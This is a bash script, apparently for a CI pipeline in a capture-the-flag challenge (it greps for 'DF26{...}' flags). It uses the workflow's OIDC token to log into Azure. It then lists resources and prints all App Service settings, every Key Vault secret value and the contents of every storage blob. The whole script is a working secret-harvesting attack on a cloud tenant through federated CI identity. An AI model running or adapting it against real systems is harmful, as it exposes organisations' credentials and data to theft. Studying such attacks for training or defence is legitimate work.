#!/usr/bin/env bash
set -euo pipefail

echo "::group::OIDC -> Azure AD"
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)

az login --service-principal \
  -u "${AZURE_CLIENT_ID}" \
  --tenant "${AZURE_TENANT_ID}" \
  --federated-token "${OIDC}" >/dev/null
az account set --subscription "${AZURE_SUBSCRIPTION_ID}" || true
az account show -o json | jq '{tenantId,id,user:.user.name}'
echo "::endgroup::"

echo "::group::Liệt kê tài nguyên"
az resource list -o table || true
echo "::endgroup::"

echo "::group::App Service settings"
az webapp list --query '[].[name,resourceGroup]' -o tsv 2>/dev/null | while read -r n g; do
  echo "--- $n / $g"
  az webapp config appsettings list -n "$n" -g "$g" -o json 2>/dev/null | jq -r '.[]|"\(.name)=\(.value)"'
done
echo "::endgroup::"

echo "::group::Key Vault"
az keyvault list --query '[].name' -o tsv 2>/dev/null | while read -r v; do
  echo "--- vault $v"
  az keyvault secret list --vault-name "$v" --query '[].name' -o tsv 2>/dev/null | while read -r s; do
    echo "  secret: $s = $(az keyvault secret show --vault-name "$v" -n "$s" --query value -o tsv 2>/dev/null)"
  done
done
echo "::endgroup::"

echo "::group::Storage blobs"
az storage account list --query '[].{n:name,g:resourceGroup}' -o tsv 2>/dev/null | while read -r n g; do
  echo "--- storage $n"
  az storage container list --account-name "$n" --auth-mode login -o tsv --query '[].name' 2>/dev/null | while read -r c; do
    echo "  container: $c"
    az storage blob list --account-name "$n" -c "$c" --auth-mode login -o tsv --query '[].name' 2>/dev/null | while read -r b; do
      echo "    blob: $b"
      az storage blob download --account-name "$n" -c "$c" -n "$b" --auth-mode login --file /tmp/b.out >/dev/null 2>&1 \
        && sed -n '1,40p' /tmp/b.out
    done
  done
done
echo "::endgroup::"

echo "===== FLAG SWEEP ====="
grep -rhoaE 'DF26\{[^}]*\}' /tmp 2>/dev/null | sort -u || true
